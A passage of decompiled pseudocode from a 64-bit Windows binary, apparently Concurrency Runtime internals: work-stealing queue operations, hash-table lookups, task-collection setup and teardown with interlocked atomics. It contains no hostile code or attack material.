    if ( *(_DWORD *)(v2 + 180) <= *(_DWORD *)(v2 + 176) )
    {
      if ( *(_DWORD *)(v2 + 224) )
      {
        sub_13F142BD8((volatile __int32 *)(v2 + 224));
        *(_QWORD *)(v2 + 168) = 0i64;
        sub_13F142C20((_DWORD *)(v2 + 224));
      }
      else
      {
        *(_QWORD *)(v2 + 168) = 0i64;
      }
      sub_13F14ED5C(*(_QWORD *)(a1 + 48) + 160i64, v2, *(_DWORD *)(v2 + 164), 1);
    }
    else
    {
      sub_13F142BD8((volatile __int32 *)(v2 + 224));
      *(_QWORD *)(v2 + 168) = 0i64;
      sub_13F142C20((_DWORD *)(v2 + 224));
      sub_13F158C84(*(_QWORD *)(a1 + 48), v2);
    }
  }
  sub_13F14E658(a1, a2);
}
// 13F14ED56: variable 'a2' is possibly undefined

//----- (000000013F14ED5C) ----------------------------------------------------
char __fastcall sub_13F14ED5C(__int64 a1, signed __int64 a2, int a3, char a4)
{
  int v5; // er10
  int v7; // er11
  __int64 v8; // r8
  int v9; // er10
  __int64 v10; // r8
  __int64 v11; // rcx
  unsigned __int16 v12; // ax
  signed __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // r9

  v5 = a3 >> *(_DWORD *)(a1 + 84);
  v7 = a3 & (*(_DWORD *)(a1 + 80) - 1);
  if ( v5 >= *(_DWORD *)(a1 + 108) )
    return 0;
  v8 = *(_QWORD *)(a1 + 96);
  if ( v5 < *(_DWORD *)(a1 + 104) )
  {
    v10 = *(_QWORD *)(v8 + 8i64 * v5);
  }
  else
  {
    v9 = v5 - *(_DWORD *)(a1 + 104);
    v10 = *(_QWORD *)(v8 + 8i64 * *(int *)(a1 + 104) - 8);
    if ( v9 >= 0 )
    {
      v11 = (unsigned int)(v9 + 1);
      do
      {
        v10 = *(_QWORD *)(v10 + 8);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)v10 + 8i64 * v7), 0i64, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 16), v7, -2);
  if ( a4 )
  {
    v12 = MEMORY[0x771A31E0](a1);
    v13 = a2 + 48;
    if ( v12 <= *(int *)(a1 + 116) )
    {
      MEMORY[0x771C4CC0](a1, v13);
    }
    else
    {
      MEMORY[0x771C4CC0](a1 + 16, v13);
      if ( (unsigned __int16)MEMORY[0x771A31E0](a1 + 16) > *(int *)(a1 + 116)
        && !sub_13F14A2E4(*(_QWORD *)(a1 + 72))
        && !_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 120), 1, 0) )
      {
        v14 = MEMORY[0x771B51E0](a1 + 16);
        v15 = *(_QWORD *)(a1 + 72);
        *(_QWORD *)(a1 + 32) = v14;
        sub_13F14AA74(
          (__int64 (__fastcall **)(__int64))(a1 + 40),
          (__int64 (__fastcall *)(__int64))sub_13F14E404,
          (__int64 (__fastcall *)(__int64))a1,
          v15);
      }
    }
  }
  return 1;
}

//----- (000000013F14EE9C) ----------------------------------------------------
void __fastcall sub_13F14EE9C(__int64 a1, _QWORD **a2)
{
  __int64 *v4; // rax
  __int64 v5; // rax

  sub_13F141A20((volatile signed __int32 *)(a1 + 8));
  *a2[1] = *a2;
  (*a2)[1] = a2[1];
  v4 = *(__int64 **)a1;
  if ( a2 == *(_QWORD ***)a1 )
  {
    if ( v4 == (__int64 *)v4[1] )
      v5 = 0i64;
    else
      v5 = *v4;
    *(_QWORD *)a1 = v5;
  }
  sub_13F141BE8(a1 + 8);
}

//----- (000000013F14EF0C) ----------------------------------------------------
void __fastcall sub_13F14EF0C(__int64 a1, __int64 a2)
{
  sub_13F14EE9C(a1 + 144, (_QWORD **)(a2 + 160));
}

//----- (000000013F14EF20) ----------------------------------------------------
__int64 sub_13F14EF20()
{
  return sub_13F142820();
}
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14EF30) ----------------------------------------------------
__int64 __fastcall sub_13F14EF30(__int64 a1, __int64 a2)
{
  __int64 v3; // rdx
  __int64 result; // rax

  if ( a1 )
  {
    sub_13F14088C(*(_QWORD *)(a1 + 24), a2);
    sub_13F14088C(*(_QWORD *)(a1 + 16), v3);
    return sub_13F14088C(a1, 80i64);
  }
  return result;
}
// 13F14EF4A: variable 'v3' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14EF6C) ----------------------------------------------------
char __fastcall sub_13F14EF6C(__int64 a1)
{
  int *v1; // r14
  int v2; // esi
  int v3; // eax
  __int64 v4; // rdx
  _QWORD *v5; // rcx
  _QWORD *v6; // rdi
  __int64 v7; // rbp
  _QWORD *v8; // rbx
  int v9; // eax
  __int64 v10; // rbx
  __int64 v11; // rdx
  _QWORD *v12; // rcx
  __int64 v13; // rdi
  __int64 v14; // rdx
  __int64 v16; // [rsp+40h] [rbp+8h] BYREF

  v1 = (int *)(a1 + 208);
  v2 = 0;
  v3 = 0;
  if ( *(int *)(a1 + 208) <= 0 )
  {
LABEL_5:
    v6 = 0i64;
  }
  else
  {
    v4 = 0i64;
    v5 = *(_QWORD **)(a1 + 216);
    while ( !*v5 )
    {
      ++v3;
      ++v4;
      ++v5;
      if ( v4 >= *v1 )
        goto LABEL_5;
    }
    v2 = v3;
    v6 = *(_QWORD **)(*((_QWORD *)v1 + 1) + 8i64 * v3);
  }
  if ( v6 )
  {
    v7 = v2;
    do
    {
      v8 = (_QWORD *)*v6;
      if ( !*v6 )
      {
        ++v2;
        ++v7;
        v9 = v2;
        v10 = v7;
        if ( v2 >= *v1 )
        {
LABEL_13:
          v8 = 0i64;
        }
        else
        {
          v11 = *((_QWORD *)v1 + 1);
          v12 = (_QWORD *)(v11 + 8 * v7);
          while ( !*v12 )
          {
            ++v9;
            ++v10;
            ++v12;
            if ( v10 >= *v1 )
              goto LABEL_13;
          }
          v7 = v10;
          v2 = v9;
          v8 = *(_QWORD **)(v11 + 8 * v10);
        }
      }
      LOBYTE(v3) = sub_13F1505E0(v6[2]);
      if ( (_BYTE)v3 )
      {
        v13 = v6[2];
        v16 = sub_13F150654(v13);
        LOBYTE(v3) = sub_13F14E85C(v1, &v16, 0i64);
        if ( v13 )
        {
          sub_13F14F670(v13, v14);
          LOBYTE(v3) = sub_13F14088C(v13, 232i64);
        }
      }
      v6 = v8;
    }
    while ( v8 );
  }
  return v3;
}
// 13F14F031: variable 'v14' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14F07C) ----------------------------------------------------
__int64 __fastcall sub_13F14F07C(
        __int64 a1,
        unsigned __int8 (__fastcall *a2)(_QWORD, __int64),
        __int64 a3,
        unsigned __int8 (__fastcall *a4)(__int64, __int64))
{
  return sub_13F15ACA8(*(_QWORD *)(a1 + 64) + 176i64, a2, a3, a4);
}

//----- (000000013F14F088) ----------------------------------------------------
__int64 __fastcall sub_13F14F088(__int64 a1)
{
  __int64 v2; // r8
  unsigned int v3; // ecx
  __int64 v4; // rdx
  __int64 v5; // rdi
  int v6; // er9
  unsigned __int64 v7; // rcx
  __int64 v8; // rcx
  __int64 v9; // r10
  volatile __int32 *v11; // [rsp+40h] [rbp+8h]

  v11 = *(volatile __int32 **)(a1 + 16);
  sub_13F142BD8(v11);
  v2 = 0i64;
  v3 = 0;
  v4 = 0i64;
  v5 = 1i64;
  v6 = *(_DWORD *)(a1 + 4) - 1;
  *(_DWORD *)(a1 + 4) = v6;
  if ( *(_DWORD *)a1 > v6 )
  {
    *(_DWORD *)(a1 + 4) = v6 + 1;
  }
  else
  {
    v7 = v6 & (unsigned __int64)*(int *)(a1 + 8);
    v4 = *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * v7);
    v8 = *(_QWORD *)(a1 + 40) + 16 * v7;
    v2 = *(_QWORD *)v8;
    v3 = *(_DWORD *)(v8 + 8);
  }
  if ( *(_DWORD *)a1 >= v6 )
  {
    *(_DWORD *)(a1 + 12) += *(_DWORD *)a1;
    *(_DWORD *)a1 = 0;
    *(_DWORD *)(a1 + 4) = 0;
    *(_DWORD *)(a1 + 28) = 0;
    *(_BYTE *)(a1 + 24) = 0;
  }
  if ( (v4 & 1) != 0
    && ((v4 &= ~1ui64, v9 = *(_QWORD *)(*(_QWORD *)(v2 + 24) + 8i64 * v3), v9 == 1)
     || _InterlockedExchange64((volatile __int64 *)(*(_QWORD *)(v2 + 24) + 8i64 * v3), 1i64) != v9) )
  {
    if ( _InterlockedExchangeAdd((volatile signed __int32 *)(v2 + 36), 0xFFFFFFFF) == 1 )
      sub_13F14AA74(
        (__int64 (__fastcall **)(__int64))(v2 + 48),
        (__int64 (__fastcall *)(__int64))sub_13F14EF30,
        (__int64 (__fastcall *)(__int64))v2,
        *(_QWORD *)v2);
  }
  else
  {
    v5 = v4;
  }
  sub_13F142C20(v11);
  return v5;
}

//----- (000000013F14F17C) ----------------------------------------------------
void **sub_13F14F17C()
{
  void *retaddr; // [rsp+68h] [rbp+0h] BYREF

  return &retaddr;
}
// 13F14F17C: returning address of temporary local variable '%" r"'

//----- (000000013F14F218) ----------------------------------------------------
__int64 __fastcall sub_13F14F218(__int64 a1, int a2)
{
  int v2; // edx
  __int64 v4; // r10
  unsigned int *v5; // r9
  __int64 v6; // r8
  __int64 v7; // r8

  v2 = a2 - *(_DWORD *)(a1 + 12);
  if ( v2 == *(_DWORD *)(a1 + 4) - 1 )
    return sub_13F14EAF4(a1);
  if ( v2 >= *(_DWORD *)(a1 + 4) || v2 < *(_DWORD *)a1 )
    return 0i64;
  v4 = _InterlockedExchange64(
         (volatile __int64 *)(*(_QWORD *)(a1 + 32) + 8 * (v2 & (unsigned __int64)*(int *)(a1 + 8))),
         0i64);
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1ui64;
  v5 = (unsigned int *)(*(_QWORD *)(a1 + 40) + 16 * (v2 & (unsigned __int64)*(int *)(a1 + 8)));
  v6 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)v5 + 24i64) + 8i64 * v5[2]);
  if ( v6 != 1
    && _InterlockedExchange64((volatile __int64 *)(*(_QWORD *)(*(_QWORD *)v5 + 24i64) + 8i64 * v5[2]), 1i64) == v6 )
  {
    return v4;
  }
  v7 = *(_QWORD *)v5;
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)(*(_QWORD *)v5 + 36i64), 0xFFFFFFFF) == 1 )
    sub_13F14AA74(
      (__int64 (__fastcall **)(__int64))(v7 + 48),
      (__int64 (__fastcall *)(__int64))sub_13F14EF30,
      (__int64 (__fastcall *)(__int64))v7,
      *(_QWORD *)v7);
  return 1i64;
}

//----- (000000013F14F2DC) ----------------------------------------------------
__int64 __fastcall sub_13F14F2DC(__int64 a1, int a2)
{
  return sub_13F14F218(*(_QWORD *)(a1 + 64) + 176i64, a2);
}

//----- (000000013F14F2EC) ----------------------------------------------------
__int64 __fastcall sub_13F14F2EC(int *a1)
{
  int v2; // esi
  __int64 v3; // r14
  _QWORD *v4; // rcx
  _QWORD *v5; // rbx
  __int64 v6; // r8
  __int64 result; // rax

  if ( a1[1] > 0 )
  {
    v2 = 0;
    if ( *a1 > 0 )
    {
      v3 = 0i64;
      do
      {
        v4 = *(_QWORD **)(v3 + *((_QWORD *)a1 + 1));
        if ( v4 )
        {
          do
          {
            v5 = (_QWORD *)*v4;
            sub_13F14088C(v4, 24i64);
            v4 = v5;
          }
          while ( v5 );
        }
        ++v2;
        v3 += 8i64;
      }
      while ( v2 < *a1 );
    }
    v6 = *a1;
    a1[1] = 0;
    return sub_13F15EF70(*((_QWORD *)a1 + 1), 0, 8 * v6);
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14F36C) ----------------------------------------------------
__int64 __fastcall sub_13F14F36C(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  __int64 result; // rax

  *(_QWORD *)a1 = off_13F18AEA0;
  *(_DWORD *)(a1 + 8) = a4;
  *(_QWORD *)a1 = off_13F18AEB8;
  *(_DWORD *)(a1 + 16) = 3;
  sub_13F1790A4(a1 + 24);
  sub_13F10A210(a1 + 96, 2);
  *(_QWORD *)(a1 + 184) = 0i64;
  *(_QWORD *)a1 = off_13F18AED8;
  result = a1;
  *(_QWORD *)(a1 + 192) = a2;
  *(_QWORD *)(a1 + 200) = a3;
  *(_BYTE *)(a1 + 176) = 0;
  return result;
}
// 13F1790A4: using guessed type __int64 __fastcall sub_13F1790A4(_QWORD);
// 13F18AEA0: using guessed type __int64 (__fastcall *off_13F18AEA0[3])();
// 13F18AEB8: using guessed type __int64 (__fastcall *off_13F18AEB8[4])();
// 13F18AED8: using guessed type __int64 (__fastcall *off_13F18AED8[4])();

//----- (000000013F14F3F4) ----------------------------------------------------
_QWORD *__fastcall sub_13F14F3F4(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F18AE88;
  return a1;
}
// 13F18AE88: using guessed type __int64 (__fastcall *off_13F18AE88[3])();

//----- (000000013F14F434) ----------------------------------------------------
_QWORD *__fastcall sub_13F14F434(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F18AE88;
  return a1;
}
// 13F18AE88: using guessed type __int64 (__fastcall *off_13F18AE88[3])();

//----- (000000013F14F44C) ----------------------------------------------------
signed __int64 __fastcall sub_13F14F44C(signed __int64 a1, __int64 a2, char a3)
{
  _QWORD *v6; // rax
  __int64 v7; // rax
  __int64 v8; // rcx
  signed __int64 v9; // rax
  signed __int64 v10; // rax
  signed __int64 v11; // rtt
  signed __int64 v12; // rdx
  __int64 v13; // rax
  __int64 v14; // rdi
  __int64 v15; // rcx

  *(_DWORD *)(a1 + 8) |= 0xFFFFFFFu;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_DWORD *)(a1 + 32) = 0;
  *(_DWORD *)(a1 + 36) = 0x80000000;
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_DWORD *)(a1 + 88) = 0;
  sub_13F14C910((_QWORD *)(a1 + 96));
  *(_QWORD *)(a1 + 168) = *(_QWORD *)(a2 + 168);
  *(_QWORD *)(a1 + 184) = 0i64;
  *(_DWORD *)(a1 + 200) = 0;
  *(_DWORD *)(a1 + 212) = 0;
  *(_QWORD *)(a1 + 216) = 0i64;
  v6 = sub_13F1490A8();
  *(_QWORD *)(a1 + 24) = v6;
  *(_QWORD *)a1 = v6[12];
  v7 = *(_QWORD *)(a2 + 16);
  *(_QWORD *)(a1 + 16) = v7;
  if ( (v7 & 0xFFFFFFFFFFFFFFFDui64) != 0 )
    _InterlockedIncrement((volatile signed __int32 *)(v7 + 8));
  *(_DWORD *)(a1 + 80) = 0;
  *(_DWORD *)(a1 + 84) = 0;
  *(_DWORD *)(a1 + 204) = 0;
  *(_QWORD *)(a1 + 48) = 0i64;
  sub_13F141708((_DWORD *)(a1 + 56));
  sub_13F14D380(a1 + 96);
  if ( a3 )
  {
    v8 = *(_QWORD *)(a1 + 168);
    v9 = *(_QWORD *)(v8 + 176);
    *(_QWORD *)(a1 + 176) = v9;
    v11 = v9;
    v10 = _InterlockedCompareExchange64((volatile signed __int64 *)(v8 + 176), a1, v9);
    if ( v11 != v10 )
    {
      do
      {
        v12 = v10;
        *(_QWORD *)(a1 + 176) = v10;
        v10 = _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)(a1 + 168) + 176i64), a1, v10);
      }
      while ( v10 != v12 );
    }
  }
  else
  {
    *(_DWORD *)(a1 + 200) |= 1u;
    *(_QWORD *)(a1 + 176) = 0i64;
  }
  v13 = sub_13F1492D4();
  v14 = v13;
  v15 = *(_QWORD *)(v13 + 64);
  if ( !v15 )
  {
    sub_13F14E5B0(v13);
    v15 = *(_QWORD *)(v14 + 64);
  }
  *(_DWORD *)(a1 + 208) = *(_DWORD *)(v15 + 160);
  *(_DWORD *)(a1 + 8) &= 0xFFFFFFFu;
  return a1;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F1B71D4: using guessed type int dword_13F1B71D4;
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14F5D0) ----------------------------------------------------
_QWORD *__fastcall sub_13F14F5D0(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189E60;
  return a1;
}
// 13F189E60: using guessed type __int64 (__fastcall *off_13F189E60[3])();

//----- (000000013F14F610) ----------------------------------------------------
__int64 *__fastcall sub_13F14F610(_QWORD *a1)
{
  __int64 *result; // rax
  __int64 v2; // rcx
  _DWORD *v3; // rcx

  result = qword_13F18AEF8;
  *a1 = qword_13F18AEF8;
  v2 = a1[1];
  if ( v2 )
  {
    v3 = (_DWORD *)(v2 - 16);
    if ( *v3 == 56797 )
      return (__int64 *)sub_13F16A188(v3);
  }
  return result;
}
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F18AEF8: using guessed type __int64 qword_13F18AEF8[7];

//----- (000000013F14F640) ----------------------------------------------------
void __fastcall sub_13F14F640(__int64 a1)
{
  int v1; // eax

  if ( *(_BYTE *)(a1 + 8) )
  {
    v1 = sub_13F10A264(*(_QWORD *)a1);
    if ( v1 )
      sub_13F109DF8(v1);
  }
}

//----- (000000013F14F670) ----------------------------------------------------
char __fastcall sub_13F14F670(__int64 a1, __int64 a2)
{
  bool v3; // si
  __int64 v4; // rcx
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rcx
  unsigned __int64 v8; // rbx
  volatile signed __int32 *v9; // rcx
  __int64 pExceptionObject[4]; // [rsp+28h] [rbp-20h] BYREF

  v3 = 0;
  if ( *(_QWORD *)(a1 + 168) == a1 || (*(_DWORD *)(a1 + 200) & 1) != 0 )
  {
    v3 = !sub_13F150958(a1, 0);
    if ( *(_QWORD *)(a1 + 168) == a1 )
    {
      v4 = *(_QWORD *)(a1 + 176);
      if ( v4 )
      {
        do
        {
          v5 = *(_QWORD *)(v4 + 176);
          sub_13F1507A0(v4, a2);
          v4 = v5;
        }
        while ( v5 );
      }
    }
  }
  v6 = *(_QWORD *)(a1 + 184);
  if ( v6 )
  {
    v7 = *(_QWORD *)(v6 + 8);
    if ( v7 )
      sub_13F14088C(v7, a2);
    sub_13F14088C(v6, 24i64);
  }
  v8 = *(_QWORD *)(a1 + 40) & 0xFFFFFFFFFFFFFFFCui64;
  if ( v8 && v8 != 12 )
  {
    sub_13F178E30(*(_QWORD *)(a1 + 40) & 0xFFFFFFFFFFFFFFFCui64);
    sub_13F14088C(v8, 16i64);
  }
  v9 = *(volatile signed __int32 **)(a1 + 16);
  if ( ((unsigned __int64)v9 & 0xFFFFFFFFFFFFFFFDui64) != 0 && _InterlockedExchangeAdd(v9 + 2, 0xFFFFFFFF) == 1 )
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v9 + 8i64))(v9);
  if ( v3 )
  {
    sub_13F142E10(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVmissing_wait_Concurrency__);
  }
  return sub_13F14C9E0((__int64 **)(a1 + 96));
}
// 13F14F6CC: variable 'a2' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F14F670: using guessed type _QWORD pExceptionObject[4];

//----- (000000013F14F78C) ----------------------------------------------------
__int64 __fastcall sub_13F14F78C(__int64 a1)
{
  return sub_13F178E30(a1);
}

//----- (000000013F14F7A4) ----------------------------------------------------
_QWORD *__fastcall sub_13F14F7A4(_QWORD *a1, char a2)
{
  __int64 v4; // rcx
  _DWORD *v5; // rcx

  *a1 = qword_13F18AEF8;
  v4 = a1[1];
  if ( v4 )
  {
    v5 = (_DWORD *)(v4 - 16);
    if ( *v5 == 56797 )
      sub_13F16A188(v5);
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 24i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F18AEF8: using guessed type __int64 qword_13F18AEF8[7];

//----- (000000013F14F7F8) ----------------------------------------------------
_QWORD *__fastcall sub_13F14F7F8(_QWORD *a1, char a2)
{
  *a1 = off_13F18AEB8;
  sub_13F10A1FC((__int64)(a1 + 12));
  sub_13F179094((__int64)(a1 + 3));
  *a1 = off_13F18AEA0;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 208i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18AEA0: using guessed type __int64 (__fastcall *off_13F18AEA0[3])();
// 13F18AEB8: using guessed type __int64 (__fastcall *off_13F18AEB8[4])();

//----- (000000013F14F850) ----------------------------------------------------
_QWORD *__fastcall sub_13F14F850(_QWORD *a1, char a2)
{
  *a1 = off_13F18AEB8;
  sub_13F10A1FC((__int64)(a1 + 12));
  sub_13F179094((__int64)(a1 + 3));
  *a1 = off_13F18AEA0;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 192i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18AEA0: using guessed type __int64 (__fastcall *off_13F18AEA0[3])();
// 13F18AEB8: using guessed type __int64 (__fastcall *off_13F18AEB8[4])();

//----- (000000013F14F8A8) ----------------------------------------------------
_QWORD *__fastcall sub_13F14F8A8(_QWORD *a1, char a2)
{
  *a1 = off_13F18AEA0;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 16i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18AEA0: using guessed type __int64 (__fastcall *off_13F18AEA0[3])();

//----- (000000013F14F8D4) ----------------------------------------------------
_QWORD *__fastcall sub_13F14F8D4(int *a1, _QWORD *a2, _QWORD *a3)
{
  unsigned __int64 v3; // r9
  unsigned __int64 i; // r10
  __int64 v5; // rax
  _QWORD *result; // rax

  v3 = 0xCBF29CE484222325ui64;
  for ( i = 0i64; i < 8; ++i )
  {
    v5 = *((unsigned __int8 *)a2 + i);
    v3 = 0x100000001B3i64 * (v5 ^ v3);
  }
  result = *(_QWORD **)(*((_QWORD *)a1 + 1) + 8i64 * (int)(v3 % *a1));
  if ( result )
  {
    while ( result[1] != *a2 )
    {
      result = (_QWORD *)*result;
      if ( !result )
        goto LABEL_6;
    }
  }
  else
  {
LABEL_6:
    result = 0i64;
  }
  if ( result )
  {
    if ( a3 )
      *a3 = result[2];
  }
  return result;
}

//----- (000000013F14F950) ----------------------------------------------------
__int64 __fastcall sub_13F14F950(__int64 a1, __int64 a2)
{
  int *v2; // rdi
  _QWORD *v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rdx
  __int64 v7; // [rsp+30h] [rbp+8h] BYREF
  __int64 v8; // [rsp+38h] [rbp+10h] BYREF

  v8 = a2;
  v2 = (int *)(a1 + 208);
  v3 = sub_13F14F8D4((int *)(a1 + 208), &v8, 0i64);
  if ( v3 )
    v4 = v3[2];
  else
    v4 = 0i64;
  if ( v4 && (*(_DWORD *)(v4 + 200) & 2) != 0 )
  {
    v7 = *(_QWORD *)(v4 + 168);
    sub_13F14E85C(v2, &v7, 0i64);
    sub_13F14F670(v4, v5);
    sub_13F14088C(v4, 232i64);
    return 0i64;
  }
  return v4;
}
// 13F14F9B3: variable 'v5' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14F9D8) ----------------------------------------------------
_QWORD *__fastcall sub_13F14F9D8(int *a1, _QWORD *a2, _QWORD *a3)
{
  unsigned __int64 v5; // rcx
  unsigned __int64 v7; // r9
  __int64 v8; // rax
  __int64 v9; // rsi
  _QWORD *v10; // rcx
  _QWORD *v11; // rax
  _QWORD *v12; // r8
  _QWORD *result; // rax

  v5 = 0i64;
  v7 = 0xCBF29CE484222325ui64;
  do
  {
    v8 = *((unsigned __int8 *)a2 + v5++);
    v7 = 0x100000001B3i64 * (v8 ^ v7);
  }
  while ( v5 < 8 );
  v9 = (int)(v7 % *a1);
  v10 = *(_QWORD **)(*((_QWORD *)a1 + 1) + 8 * v9);
  if ( v10 )
  {
    while ( v10[1] != *a2 )
    {
      v10 = (_QWORD *)*v10;
      if ( !v10 )
        goto LABEL_6;
    }
  }
  else
  {
LABEL_6:
    v10 = 0i64;
  }
  if ( v10 )
    return 0i64;
  v11 = (_QWORD *)sub_13F14059C(24i64);
  v12 = v11;
  if ( v11 )
  {
    *v11 = 0i64;
    v11[1] = *a2;
    v11[2] = *a3;
  }
  else
  {
    v12 = 0i64;
  }
  result = v12;
  *v12 = *(_QWORD *)(*((_QWORD *)a1 + 1) + 8 * v9);
  *(_QWORD *)(*((_QWORD *)a1 + 1) + 8 * v9) = v12;
  ++a1[1];
  return result;
}

//----- (000000013F14FAB4) ----------------------------------------------------
void __fastcall sub_13F14FAB4(__int64 a1, char a2)
{
  __int64 v4; // rbp
  __int64 v5; // rsi
  __int64 v7; // rdi
  __int64 v8; // rcx
  int v9; // edx
  int v10; // ecx
  __int64 v11; // rax
  char v12; // al
  bool v13; // al
  __int64 v14; // rax

  v4 = sub_13F1492D4();
  v5 = *(_QWORD *)(a1 + 184);
  if ( *(_QWORD *)(a1 + 168) != a1 && (*(_DWORD *)(a1 + 200) & 1) != 0 )
    v7 = 0i64;
  else
    v7 = *(_QWORD *)(*(_QWORD *)(a1 + 168) + 176i64);
  if ( v5 && *(_BYTE *)(v5 + 16) )
  {
    sub_13F14FC80(a1, v4);
    *(_BYTE *)(v5 + 16) = 0;
  }
  else
  {
    while ( 1 )
    {
      v10 = *(_DWORD *)(a1 + 212);
      if ( v10 <= 0 )
        break;
      if ( (unsigned int)v10 <= 2 )
      {
        v9 = *(_DWORD *)(a1 + 4i64 * v10 + 188);
      }
      else
      {
        v8 = *(int *)(v5 + 4);
        *(_DWORD *)(v5 + 4) = v8 - 1;
        v9 = *(_DWORD *)(*(_QWORD *)(v5 + 8) + 4 * v8 - 4);
        v10 = *(_DWORD *)(a1 + 212);
      }
      *(_DWORD *)(a1 + 212) = v10 - 1;
      v11 = sub_13F14F2DC(v4, v9);
      if ( !v11 )
        break;
      if ( v11 != 1 )
      {
        if ( *(_BYTE *)(v4 + 136) )
          ++*(_DWORD *)(*(_QWORD *)(v4 + 248) + 36i64);
        else
          ++*(_DWORD *)(*(_QWORD *)(v4 + 248) + 164i64);
        *(_QWORD *)(v11 + 16) = 0i64;
        sub_13F1505EC(a1, v11);
      }
    }
  }
  while ( 1 )
  {
    if ( a2
      || *(int *)(a1 + 32) > 0
      || (*(_QWORD *)(a1 + 168) == a1 || (*(_DWORD *)(a1 + 200) & 1) != 0 ? (v12 = 0) : (v12 = 1), v12 || v7) )
    {
      sub_13F14FE64(*(_QWORD *)(a1 + 168), 0, v7);
    }
    sub_13F1502F0(a1, v7);
    v13 = *(_QWORD *)(a1 + 168) != a1 && (*(_DWORD *)(a1 + 200) & 1) != 0;
    v14 = v13 ? 0i64 : *(_QWORD *)(*(_QWORD *)(a1 + 168) + 176i64);
    if ( v7 == v14 )
      break;
    v7 = v14;
  }
  *(_DWORD *)(a1 + 212) = 0;
  if ( v5 )
    *(_DWORD *)(v5 + 4) = 0;
  if ( !a2 )
    sub_13F1507DC(a1, v7);
}

//----- (000000013F14FC80) ----------------------------------------------------
__int64 __fastcall sub_13F14FC80(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v3; // rax
  bool v4; // zf
  __int64 v5; // rcx
  __int64 v6; // [rsp+20h] [rbp-18h] BYREF
  unsigned int v7; // [rsp+28h] [rbp-10h]

  v7 = 0;
  v6 = a1;
  result = sub_13F14F07C(
             a2,
             (unsigned __int8 (__fastcall *)(_QWORD, __int64))sub_13F150104,
             (__int64)&v6,
             (unsigned __int8 (__fastcall *)(__int64, __int64))sub_13F150938);
  if ( v7 )
  {
    v3 = sub_13F1492D4();
    v4 = *(_BYTE *)(v3 + 136) == 0;
    v5 = *(_QWORD *)(v3 + 248);
    result = v7;
    if ( v4 )
      *(_DWORD *)(v5 + 164) += v7;
    else
      *(_DWORD *)(v5 + 36) += v7;
  }
  return result;
}

//----- (000000013F14FCDC) ----------------------------------------------------
__int64 __fastcall sub_13F14FCDC(__int64 a1)
{
  signed __int64 v2; // rsi
  int *v3; // rbx
  __int64 v4; // rax
  __int64 result; // rax
  __int64 v6; // rax
  __int64 v7; // [rsp+40h] [rbp+8h] BYREF
  __int64 v8; // [rsp+48h] [rbp+10h] BYREF

  v2 = 0i64;
  v3 = (int *)sub_13F1490A8();
  v4 = *((_QWORD *)v3 + 8);
  if ( !v4 )
  {
    sub_13F14E5B0((__int64)v3);
    v4 = *((_QWORD *)v3 + 8);
  }
  if ( v3 == *(int **)(a1 + 24) && *(_DWORD *)(v4 + 160) == *(_DWORD *)(a1 + 208) )
    return a1;
  result = sub_13F1047B0((__int64)v3);
  if ( !result || *(_QWORD *)(result + 168) != a1 )
  {
    result = sub_13F14F950((__int64)v3, a1);
    if ( !result )
    {
      v6 = sub_13F14059C(232i64);
      v7 = v6;
      if ( v6 )
        v2 = sub_13F14F44C(v6, a1, 1);
      v7 = v2;
      v8 = a1;
      sub_13F14EF6C((__int64)v3);
